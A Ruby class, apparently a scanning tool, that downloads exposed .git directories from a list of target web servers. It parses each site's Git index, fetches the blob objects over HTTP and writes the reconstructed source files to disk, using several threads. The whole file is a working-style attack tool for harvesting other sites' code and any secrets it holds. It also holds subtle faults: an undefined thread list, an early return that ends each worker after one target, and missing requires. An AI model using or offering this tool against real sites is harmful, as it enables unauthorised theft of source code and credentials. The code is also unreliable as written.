require 'httpclient'
require 'fileutils'

class GitDumper
  def initialize(target_list, path = "git/", threads = 5)
    return nil if target_list.nil?
    @target_list = target_list
    @path = path
    @threads = threads
    @callbacks = {
      :FOUND => self.method(:defaultCallback_FOUND),
      :ON_TARGET_FINISH => self.method(:defaultCallback_ON_TARGET_FINISH),
    }
  end
  
  def dumpGit(target)
    ua = HTTPClient.new
    resp = ua.get("http://#{target}/.git/index")
    index = StringIO.new(resp.content)
    nuls = index.read(8)
    entry_count = index.read(4).unpack("N")[0]
    entry_count.times do |i|
      entry = {}
      nuls = index.read(40)
      entry[:id] = index.read(20).unpack("H40")[0]
      entry[:flags] = {}
      flags = index.read(2).unpack("n")[0]
      entry[:flags][:name_length] = flags & 0xFFF
      entrylen = 62
      entry[:name] = index.read(entry[:flags][:name_length])
      entrylen += entry[:flags][:name_length]
      padlen = (8 - (entrylen % 8)) or 8
      nuls = index.read(padlen)
      file_resp = ua.get("http://#{target}/.git/objects/#{entry[:id][0,2]}/#{entry[:id][2,40]}")
      if file_resp.status == 200
        @callbacks[:FOUND].call(target, entry[:name])
        file_path = "#{path}/#{target}/#{entry[:name]}"
        FileUtils::mkdir_p(File.dirname(file_path)) unless File.exists?(File.dirname(file_path))
        file_content = Zlib::Inflate.inflate(file_resp.content)
        file = File.open(file_path, 'w')
        file.puts(file_content.gsub(/blob [0-9]{0,}\0/, ""))
      end
    end
    return true
  end
  
  def run
    @threads.times do
      threads_list << Thread.new do
        while @target_list.size > 0
          target = @target_list.pop
          dumpGit(target)
          @callbacks[:ON_TARGET_FINISH].call(target)
          return true
        end
      end
    end
  end
  
  def defaultCallback_FOUND(target, filename)
    puts "[FOUND] #{filename}"
  end
  
  def defaultCallback_ON_TARGET_FINISH(target)
    puts "[Results] #{target} successfully dumped"
  end
  
  def setCallback_FOUND(&block)
    if block.respond_to?('call')
      @callbacks[:FOUND] = block
      return true
    end
    false
  end
  
  def setCallback_ON_TARGET_FINISH(&block)
    if block.respond_to?('call')
      @callbacks[:ON_TARGET_FINISH] = block
      return true
    end
    false
  end
  
end